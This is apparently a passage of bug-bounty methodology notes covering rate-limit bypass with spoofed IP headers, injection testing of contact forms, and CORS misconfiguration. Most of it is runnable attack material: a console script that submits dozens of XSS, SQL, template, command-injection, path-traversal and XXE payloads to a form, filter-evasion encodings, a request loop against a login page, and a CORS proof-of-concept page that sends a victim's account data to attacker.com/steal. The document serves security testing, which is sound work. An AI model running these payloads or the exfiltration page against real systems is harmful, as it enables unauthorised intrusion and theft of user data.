X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### Akamai

```http
True-Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Akamai-Session-Info: 1234567890
```

### AWS CloudFront

```http
X-Forwarded-For: 127.0.0.1
CloudFront-Forwarded-Proto: https
CloudFront-Is-Desktop-Viewer: true
CloudFront-Is-Mobile-Viewer: false
CloudFront-Is-SmartTV-Viewer: false
CloudFront-Is-Tablet-Viewer: false
CloudFront-Viewer-Country: US
```

### Azure CDN

```http
X-Forwarded-For: 127.0.0.1
X-Azure-ClientIP: 127.0.0.1
X-Azure-Ref: 1234567890
```

## Testing Methodology

### Step 1: Trigger Rate Limit

```bash
# Send multiple requests to trigger 429
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code}" https://target.com/login
done
```

### Step 2: Test Bypass Headers

```bash
# Test each header
curl -H "CF-Connecting-IP: 127.0.0.1" https://target.com/login
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/login
curl -H "X-Real-IP: 127.0.0.1" https://target.com/login
```

### Step 3: Verify Bypass

```bash
# If bypass works, you'll get 200 instead of 429
curl -s -o /dev/null -w "%{http_code}" -H "CF-Connecting-IP: 127.0.0.1" https://target.com/login
```

## Common Endpoints to Test

- `/login` — Login endpoint
- `/register` — Registration endpoint
- `/forgot-password` — Password reset endpoint
- `/api/auth` — Authentication API
- `/api/v1/auth` — Versioned auth API
- `/contact/send` — Contact form endpoint
- `/.env` — Environment file
- `/.git/config` — Git config file

## References

- OWASP Rate Limiting: https://owasp.org/www-community/controls/Rate_Limiting
- PortSwigger Rate Limiting: https://portswigger.net/web-security/rate-limiting
- HackerOne Reports: Search for "rate limiting bypass" on HackerOne

# Contact Form Injection Testing

Comprehensive guide to testing contact forms for injection vulnerabilities during bug bounty testing.

## Overview

Contact forms are common attack surfaces in web applications. They often accept user input that is stored in a database and rendered in admin panels, making them prime targets for **Stored XSS**, **SQLi**, **SSTI**, **SSRF**, and other injection attacks.

## Testing Methodology

### Step 1: Identify the Contact Form

```javascript
// Find contact form
const form = document.querySelector('#contactForm, form[action*="contact"], form[action*="send"]');
if (!form) {
    console.log('No contact form found');
    return;
}

console.log('Action:', form.action);
console.log('Method:', form.method);
console.log('Inputs:', Array.from(form.querySelectorAll('input, textarea')).map(i => i.name));
```

### Step 2: Get CSRF Token

```javascript
// Get CSRF token from meta tag
const csrf = document.querySelector('meta[name="csrf-token"]')?.content;

// Or from hidden input
const csrfInput = form.querySelector('input[name*="csrf"], input[name*="token"]');
const csrf = csrfInput?.value;
```

### Step 3: Test Injection Payloads

**CRITICAL: Use XMLHttpRequest, not fetch() — fetch() returns status 0 due to CORS on many sites.**

```javascript
(async () => {
    const payloads = [
        // XSS
        {name: 'XSS Script', payload: '<script>alert(1)</script> Test message for consultation purpose.'},
        {name: 'XSS Img', payload: '<img src=x onerror=alert(1)> Test message for consultation purpose.'},
        {name: 'XSS Svg', payload: '<svg onload=alert(1)> Test message for consultation purpose.'},
        {name: 'XSS Details', payload: '<details open ontoggle=alert(1)> Test message for consultation purpose.'},
        {name: 'XSS Input', payload: '<input onfocus=alert(1) autofocus> Test message for consultation purpose.'},
        {name: 'XSS Body', payload: '<body onload=alert(1)> Test message for consultation purpose.'},
        
        // SQLi
        {name: 'SQLi OR', payload: "' OR '1'='1 Test message for consultation purpose."},
        {name: 'SQLi Comment', payload: "' OR 1=1-- Test message for consultation purpose."},
        {name: 'SQLi AND', payload: "' AND 1=1-- Test message for consultation purpose."},
        {name: 'SQLi Sleep', payload: "' AND SLEEP(5)-- Test message for consultation purpose."},
        {name: 'SQLi Waitfor', payload: "' WAITFOR DELAY '0:0:5'-- Test message for consultation purpose."},
        
        // SSTI
        {name: 'SSTI Multiply', payload: '{{7*7}} Test message for consultation purpose.'},
        {name: 'SSTI Dollar', payload: '${7*7} Test message for consultation purpose.'},
        {name: 'SSTI ERB', payload: '<%= 7*7 %> Test message for consultation purpose.'},
        {name: 'SSTI Hash', payload: '#{7*7} Test message for consultation purpose.'},
        {name: 'SSTI Config', payload: '{{config}} Test message for consultation purpose.'},
        {name: 'SSTI Self', payload: '{{self}} Test message for consultation purpose.'},
        {name: 'SSTI Request', payload: '{{request}} Test message for consultation purpose.'},
        
        // SSRF
        {name: 'SSRF Localhost', payload: 'http://127.0.0.1 Test message for consultation purpose.'},
        {name: 'SSRF Local', payload: 'http://localhost Test message for consultation purpose.'},
        {name: 'SSRF Metadata', payload: 'http://169.254.169.254 Test message for consultation purpose.'},
        {name: 'SSRF IPv6', payload: 'http://[::1] Test message for consultation purpose.'},
        
        // Command Injection
        {name: 'Cmd Semicolon', payload: '; ls -la Test message for consultation purpose.'},
        {name: 'Cmd Pipe', payload: '| ls -la Test message for consultation purpose.'},
        {name: 'Cmd And', payload: '&& ls -la Test message for consultation purpose.'},
        {name: 'Cmd Subshell', payload: '$(ls -la) Test message for consultation purpose.'},
        {name: 'Cmd Backtick', payload: '`ls -la` Test message for consultation purpose.'},
        
        // Path Traversal
        {name: 'Path Unix', payload: '../../../etc/passwd Test message for consultation purpose.'},
        {name: 'Path Windows', payload: '..\\..\\..\\windows\\system32\\config\\sam Test message for consultation purpose.'},
        
        // LDAP Injection
        {name: 'LDAP Wildcard', payload: "*()|&' Test message for consultation purpose."},
        {name: 'LDAP UID', payload: "*()|&'uid=* Test message for consultation purpose."},
        
        // XML Injection
        {name: 'XML XXE', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo> Test message for consultation purpose.'},
        
        // NoSQL Injection
        {name: 'NoSQL GT', payload: '{"$gt":""} Test message for consultation purpose.'},
        {name: 'NoSQL NE', payload: '{"$ne":""} Test message for consultation purpose.'},
        
        // Header Injection
        {name: 'Header CRLF', payload: 'test\r\nX-Injected: true Test message for consultation purpose.'},
        {name: 'Header LF', payload: 'test\nX-Injected: true Test message for consultation purpose.'},
        
        // Open Redirect
        {name: 'Redirect HTTPS', payload: 'https://evil.com Test message for consultation purpose.'},
        {name: 'Redirect Protocol', payload: '//evil.com Test message for consultation purpose.'},
        {name: 'Redirect JS', payload: 'javascript:alert(1) Test message for consultation purpose.'}
    ];
    
    const results = [];
    for (const item of payloads) {
        const formData = new FormData();
        formData.append('name', 'Test User');
        formData.append('email', 'test@test.com');
        formData.append('phone', '1234567890');
        formData.append('purpose', item.payload);
        
        // Get CSRF token
        const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
        if (csrf) formData.append('csrf_test_name', csrf);
        
        // Use XHR instead of fetch
        const response = await new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/contact/send', true);
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.onload = () => resolve({status: xhr.status, body: xhr.responseText});
            xhr.onerror = () => resolve({error: 'XHR error'});
            xhr.send(formData);
        });
        
        results.push({
            name: item.name,
            payload: item.payload.substring(0, 30),
            status: response.status,
            accepted: response.body?.includes('success') || response.body?.includes('berhasil'),
            response: response.body?.substring(0, 100)
        });
    }
    
    console.table(results);
    return results;
})()
```

### Step 4: Handle Validation Errors

If you get validation errors like `validation.purpose.min_length`, pad the payload:

```javascript
// Pad payload to meet min length (usually 10-20 characters)
const payload = '{{7*7}} ' + 'A'.repeat(50) + ' Test message.';

// Or use a longer payload
const payload = '<script>alert(1)</script> This is a test message for consultation purpose. Please contact me back.';
```

### Step 5: Verify Stored XSS

If you can access the admin panel, check if payloads are rendered:

1. Navigate to admin panel
2. Go to contact form submissions
3. Look for unescaped HTML in the response
4. Check if JavaScript executes

## Common Validation Patterns

### Input Validation

| Field | Validation | Bypass |
|-------|-----------|--------|
| `name` | `alpha_numeric_space` | Only alphanumeric, spaces, and some special chars |
| `email` | `email` | Must be valid email format |
| `phone` | `numeric` | Only numbers |
| `purpose` | `min_length` | Must meet minimum length |

### Server-side Validation

- **PHP**: `filter_var()`, `htmlspecialchars()`, `mysqli_real_escape_string()`
- **Python**: `escape()`, `bleach.clean()`, `markupsafe.escape()`
- **Node.js**: `escape()`, `xss()`, `sanitize-html()`

## Bypass Techniques

### 1. Encoding Bypass

```javascript
// HTML Entity Encoding
const payload = '&#60;script&#62;alert(1)&#60;/script&#62;';

// URL Encoding
const payload = '%3Cscript%3Ealert(1)%3C/script%3E';

// Unicode Encoding
const payload = '\u003cscript\u003ealert(1)\u003c/script\u003e';

// Base64 Encoding
const payload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
```

### 2. Case Variation

```javascript
const payload = '<ScRiPt>alert(1)</ScRiPt>';
const payload = '<IMG SRC=x ONERROR=alert(1)>';
```

### 3. Null Bytes

```javascript
const payload = '<script>alert(1)</script>%00';
const payload = '<img src=x onerror=alert(1)>%00';
```

### 4. Double Encoding

```javascript
const payload = '%253Cscript%253Ealert(1)%253C/script%253E';
```

### 5. Mixed Encoding

```javascript
const payload = '<script>alert(1)</script>%0A<img src=x onerror=alert(1)>';
```

## Reporting Findings

### Severity Assessment

| Vulnerability | Severity | CVSS |
|--------------|----------|------|
| Stored XSS | High | 6.1-8.1 |
| SQLi | Critical | 9.8 |
| SSTI | Critical | 9.8 |
| SSRF | High | 7.5-8.1 |
| Command Injection | Critical | 9.8 |
| Path Traversal | Medium | 5.3-6.5 |

### PoC Template

```markdown
## Stored XSS in Contact Form

**Endpoint:** POST /contact/send
**Parameter:** purpose
**Payload:** <script>alert(1)</script>

### Steps to Reproduce
1. Navigate to https://target.com/contact
2. Fill in the contact form
3. In the "purpose" field, enter: <script>alert(1)</script>
4. Submit the form
5. Navigate to admin panel
6. Check contact form submissions
7. Observe JavaScript execution

### Impact
- Session hijacking
- Cookie theft
- Phishing attacks
- Malware distribution

### Remediation
- Implement proper input validation
- Sanitize/encode output
- Use Content Security Policy
- Use HTTPOnly cookies
```

## References

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP SSTI: https://owasp.org/www-community/attacks/Server_Side_Template_Injection
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- PortSwigger SQLi: https://portswigger.net/web-security/sql-injection
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf

# CORS Misconfiguration Testing — Complete Methodology

## Overview

CORS (Cross-Origin Resource Sharing) misconfiguration allows attacker to read authenticated data cross-origin. The vulnerability exists when:
1. Server reflects arbitrary Origin in `Access-Control-Allow-Origin`
2. Server sets `Access-Control-Allow-Credentials: true`
3. Sensitive endpoints are accessible with user cookies

## Quick Detection

```bash
# Test 1: Origin reflection
curl -sI -H "Origin: https://evil.com" https://target.com/ | grep -i "access-control-allow-origin"
# VULNERABLE if returns: Access-Control-Allow-Origin: https://evil.com

# Test 2: Credentials allowed
curl -sI -H "Origin: https://evil.com" https://target.com/ | grep -i "access-control-allow-credentials"
# VULNERABLE if returns: Access-Control-Allow-Credentials: true

# Test 3: Null origin
curl -sI -H "Origin: null" https://target.com/ | grep -i "access-control-allow-origin"
# VULNERABLE if returns: Access-Control-Allow-Origin: null
```

## Systematic Testing

### Step 1: Test Multiple Origins

```bash
for origin in "https://evil.com" "https://attacker.com" "null" "https://target.com.evil.com" "https://test.target.com"; do
  echo "=== Origin: $origin ==="
  curl -sI -H "Origin: $origin" https://target.com/ | grep -i "access-control"
done
```

### Step 2: Test All Endpoints

```bash
for path in / /api /api/v1 /api/user /api/profile /api/account /login /admin; do
  echo "=== $path ==="
  curl -sI -H "Origin: https://evil.com" "https://target.com$path" | grep -i "access-control"
done
```

### Step 3: Test All Subdomains

```bash
for sub in www app api beta uat staging; do
  echo "=== $sub.target.com ==="
  curl -sI -H "Origin: https://evil.com" "https://$sub.target.com/" | grep -i "access-control"
done
```

### Step 4: Verify with Burp MCP (if WAF blocks curl)

See `references/burp_mcp_pentest.md` for Burp MCP CORS testing workflow.

## Distinguishing Static vs Dynamic CORS Headers

**NOT all CORS headers are vulnerabilities:**

| Header | Example | Risk |
|--------|---------|------|
| `Access-Control-Allow-Methods: GET,POST` | Static | ✅ SAFE - just declares allowed methods |
| `Access-Control-Allow-Headers: Content-Type` | Static | ✅ SAFE - just declares allowed headers |
| `Access-Control-Expose-Headers: Date` | Static | ✅ SAFE - just declares exposed headers |
| `Access-Control-Allow-Origin: https://evil.com` | **Reflected** | ⚠️ CHECK - need ACAC too |
| `Access-Control-Allow-Credentials: true` | Dynamic | ⚠️ CHECK - need ACAO reflection |

**VULNERABLE combination:**
```
Access-Control-Allow-Origin: https://evil.com  ← reflected from request
Access-Control-Allow-Credentials: true          ← allows cookies
```

**SAFE (no vulnerability):**
```
Access-Control-Allow-Methods: GET,POST          ← static, not from request
Access-Control-Allow-Headers: Content-Type      ← static, not from request
```

## PoC Template

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
// PoC: Read authenticated data from vulnerable target
fetch('https://target.com/api/user', {
    credentials: 'include',
    headers: {'Content-Type': 'application/json'}
})
.then(r => r.json())
.then(data => {
    // Exfiltrate to attacker server
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    console.log('Data stolen:', data);
});
</script>
</body>
</html>
```

## Severity Scoring

| Scenario | CVSS | Severity |
|----------|------|----------|
| Origin reflected + credentials + sensitive endpoint | 7.5+ | HIGH |
| Origin reflected + credentials + public endpoint | 5.3 | MEDIUM |
| Origin reflected + no credentials | 3.1 | LOW |
| Wildcard `*` without credentials | 0.0 | INFO (normal for public APIs) |

## Common False Positives

1. **Static CORS headers**: `Access-Control-Allow-Methods` without origin reflection
2. **SPA routing**: All paths return 200 with same content (not real endpoints)
3. **CDN caching**: Different results per location/IP
4. **WAF block pages**: CORS headers on 405/403 pages may not be exploitable

## References

- [OWASP CORS Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PortSwigger CORS Guide](https://portswigger.net/web-security/cors)
- [CWE-942: Overly Permissive Cross-domain Whitelist](https://cwe.mitre.org/data/definitions/942.html)